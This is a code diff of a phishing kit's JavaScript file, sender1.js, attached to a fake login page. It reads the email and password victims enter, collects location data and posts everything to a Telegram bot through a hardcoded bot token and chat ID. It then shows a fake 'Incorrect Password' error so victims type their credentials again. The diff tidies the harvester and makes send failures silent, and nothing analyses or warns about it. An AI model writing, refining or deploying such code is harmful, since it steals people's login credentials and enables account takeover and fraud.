@@ -1,11 +1,13 @@
-// sender1.js - For use on login form in myah/index.html. Make sure to update your TELEGRAM_BOT_TOKEN and CHAT_ID.
+// myah/sender1.js - works with myah/index.html as-is
 
-const TELEGRAM_BOT_TOKEN = "8292423468:AAEQQXMHQ7jmJFyfrGX7vsWhr6GH-ORn8dk"; // <--- PUT YOUR TOKEN
-const TELEGRAM_CHAT_ID = "-5006528512";    
-(function injectErrorCSS() {
-  if (!document.getElementById('aol-sender1-css')) {
+const TELEGRAM_BOT_TOKEN = "8292423468:AAEQQXMHQ7jmJFyfrGX7vsWhr6GH-ORn8dk";
+const TELEGRAM_CHAT_ID = "-5006528512";
+
+// Inject minimal error CSS if it doesn't exist
+(function () {
+  if (!document.getElementById('sender1-css')) {
     const style = document.createElement('style');
-    style.id = 'aol-sender1-css';
+    style.id = 'sender1-css';
     style.innerHTML = `
       .input-error {
         border: 1.5px solid red !important;
@@ -29,7 +31,6 @@ document.addEventListener("DOMContentLoaded", function () {
   const form = document.getElementById("loginForm");
   if (!form) return;
 
-  // Pick first visible input with name="email" (ignore duplicated ids/classes)
   const usernameInput = form.querySelector('input[name="email"]');
   const passwordInput = form.querySelector('input[name="password"]');
   const errorMsg = document.getElementById("username-error");
@@ -67,15 +68,12 @@ ${locationInfo}
     const payload = { chat_id: TELEGRAM_CHAT_ID, text };
 
     try {
-      const res = await fetch(telegramUrl, {
+      await fetch(telegramUrl, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify(payload),
       });
-      return res.ok;
-    } catch {
-      return false;
-    }
+    } catch { /* Don't block UI on failure */ }
   }
 
   async function getLocationInfo() {
@@ -103,17 +101,13 @@ ${locationInfo}
     showError("Incorrect Password. please Try Again.");
   });
 
-  // Remove error as soon as user types (on either input)
-  if (usernameInput) {
-    usernameInput.addEventListener("input", () => {
-      usernameInput.classList.remove('input-error');
-      hideError();
-    });
-  }
-  if (passwordInput) {
-    passwordInput.addEventListener("input", () => {
-      passwordInput.classList.remove('input-error');
-      hideError();
-    });
-  }
+  // Remove error as soon as user types in either field
+  usernameInput?.addEventListener("input", () => {
+    removeInputErrorStyling();
+    hideError();
+  });
+  passwordInput?.addEventListener("input", () => {
+    removeInputErrorStyling();
+    hideError();
+  });
 });
